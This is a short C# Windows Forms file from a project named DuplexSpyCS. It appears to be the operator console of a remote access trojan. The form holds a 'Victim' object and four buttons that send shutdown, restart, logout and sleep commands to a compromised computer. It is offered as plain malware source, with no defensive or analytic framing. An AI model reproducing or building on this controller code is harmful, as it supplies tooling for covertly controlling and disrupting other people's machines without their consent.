using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmPower : Form
    {
        public Victim v;

        public frmPower()
        {
            InitializeComponent();
        }

        private void frmPower_Load(object sender, EventArgs e)
        {

        }

        //SHUTDOWN
        private void button1_Click(object sender, EventArgs e)
        {
            v.SendCommand("power|st|" + numericUpDown1.Value.ToString());
        }

        //RESTART
        private void button2_Click(object sender, EventArgs e)
        {
            v.SendCommand("power|rs|" + numericUpDown1.Value.ToString());
        }

        //LOGOUT
        private void button3_Click(object sender, EventArgs e)
        {
            v.SendCommand("power|lo");
        }

        //SLEEP
        private void button4_Click(object sender, EventArgs e)
        {
            v.SendCommand("power|sl");
        }
    }
}
